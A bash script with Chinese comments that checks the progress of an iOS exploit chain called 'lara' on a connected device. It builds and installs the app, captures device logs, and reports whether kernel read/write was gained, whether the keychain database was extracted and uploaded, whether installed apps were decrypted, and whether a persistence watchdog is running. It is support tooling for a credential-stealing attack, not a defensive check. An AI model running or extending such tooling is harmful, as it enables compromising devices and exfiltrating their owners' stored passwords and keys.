#!/usr/bin/env bash
#
# verify_chain.sh — macOS 侧真机验证脚本（Exploit 链状态检查）
#
# 用途：
#   1. 确保 lara.forceOffsets 已设（研究覆盖，26.1+ 必须）
#   2. 构建 + 安装 ipa 到已连接设备
#   3. 启动 app 触发 ds_run()，抓设备控制台日志中的链标签
#   4. 把每条链的"校准点"输出整理成可直接阅读的结论
#
# 依赖：Xcode 命令行工具、已信任的设备、ideviceinstaller 或 muxd/ios-deploy
# 用法：
#   ./verify_chain.sh [<ios_version>]    默认列出所有匹配设备
#
set -euo pipefail

CWD="$(cd "$(dirname "$0")/.." && pwd)"
IPA="${IPA:-$CWD/build/lara.ipa}"
BUNDLE_ID="${BUNDLE_ID:-com.rooootdev.lara}"   # 以实际工程为准
FORCE_KEY="${FORCE_KEY:-lara.forceOffsets}"

echo "== lara exploit-chain 真机验证 =="
echo "workdir: $CWD"

# ---- 1. forceOffsets 通知 -------------------------------------------
echo
echo "[1/4] 提醒：本机 26.1+ 必须设 $FORCE_KEY=true"
echo "      (在 app 内 Settings 或 UserDefaults 写入；否则 hasOffsets=false 且 vfs/autopipeline 不启动)"

# ---- 2. 构建（macOS only） -----------------------------------------
if [ -x "$CWD/scripts/build_ipa.sh" ]; then
    echo "[2/4] 构建 ipa（可选，若已构建可设 IPA= 跳过）"
    if [ ! -f "$IPA" ]; then
        (cd "$CWD" && ./scripts/build_ipa.sh) || { echo "构建失败"; exit 1; }
    fi
else
    echo "[2/4] 未找到 scripts/build_ipa.sh，跳过构建（假设 $IPA 已存在）"
fi

# ---- 3. 安装 + 启动 ------------------------------------------------
DEVICE="${DEVICE:-}"
if [ -n "$DEVICE" ]; then
    echo "[3/4] 安装到设备 $DEVICE (需 ideviceinstaller)"
    ideviceinstaller -u "$DEVICE" -i "$IPA" || true
    ideviceinstaller -u "$DEVICE" -l | grep -i lara || true
else
    echo "[3/4] 未指定 DEVICE，跳过安装（仅检查日志）。设备列表："
    idevice_id -l 2>/dev/null || xcrun devicectl list devices 2>/dev/null || echo "      (无 idevice 工具，手动安装后继续)"
fi

# ---- 4. 抓取链标签日志 ---------------------------------------------
echo
echo "[4/4] 采集 10 秒设备日志中的链标签（Ctrl-C 提前结束）"
TMPLOG="$(mktemp)"
if command -v idevicesyslog >/dev/null 2>&1; then
    timeout 10 idevicesyslog > "$TMPLOG" 2>&1 || true
else
    log stream --predicate 'process == "lara"' --style compact --timeout 10s > "$TMPLOG" 2>&1 || \
    log show --last 10m --predicate 'process == "lara"' > "$TMPLOG" 2>&1 || true
fi

echo "---- 匹配结果 ----"
grep -E '\(chainrouter\)|\(20626\)|\(20698\)|\(264\)|\(266\)|exploit (success|failed)' "$TMPLOG" \
    | tail -40 || echo "（未抓到链标签：app 可能未启动或 forceOffsets 未设）"

echo
echo "---- 校准点速查 ----"
grep -E 'escalation stage requires|OOB probe failed|not marking ready|staged' "$TMPLOG" \
    | tail -20 || echo "（无校准点输出）"

echo
echo "---- [目标1] 钥匙串提取 / 上传 (autopipeline) ----"
grep -E '\[autopipeline\]|keychain-2\.db:|keybag|decrypt(ed|ion)|uploaded|payload' "$TMPLOG" \
    | tail -20 || echo "（无 autopipeline 输出：vfs 未就绪或 forceOffsets 未设）"

echo
echo "---- [目标2] 砸壳 (decrypt_app) ----"
grep -E 'decrypted .*\(.*\)|decrypt failed|app list unavailable|binary not encrypted|failed to (read|parse|write)' "$TMPLOG" \
    | tail -20 || echo "（无砸壳输出：decryptBundleIDs 未配置或未到 file stage）"

echo
echo "---- [目标3] keepalive / 不重启 (KeepaliveWatchdog) ----"
grep -E 'keepalive:|recover(stash|ed)|primitive' "$TMPLOG" \
    | tail -20 || echo "（无 keepalive 输出：hasOffsets=false，watchdog 未启动）"

echo
echo "---- 汇总 ----"
if grep -q 'exploit success' "$TMPLOG"; then EXPLOIT="✔ 内核 R/W 就绪"; else EXPLOIT="✘ 未见 exploit success"; fi
if grep -q 'uploaded (hash' "$TMPLOG" || grep -q '\[autopipeline\] uploaded' "$TMPLOG"; then KC="✔ 钥匙串已上传"; else KC="✘ 未见钥匙串上传"; fi
if grep -q 'decrypted' "$TMPLOG"; then DUMP="✔ 砸壳输出"; else DUMP="✘ 未见砸壳"; fi
if grep -q 'keepalive:' "$TMPLOG"; then KA="✔ keepalive 心跳运行中"; else KA="✘ 未见 keepalive"; fi
printf '  %s\n  %s\n  %s\n  %s\n' "$EXPLOIT" "$KC" "$DUMP" "$KA"
rm -f "$TMPLOG"

echo
echo "完成。对照 docs/EXPLOIT_CHAIN_INTEGRATION.md 的 §3 判断下一步。"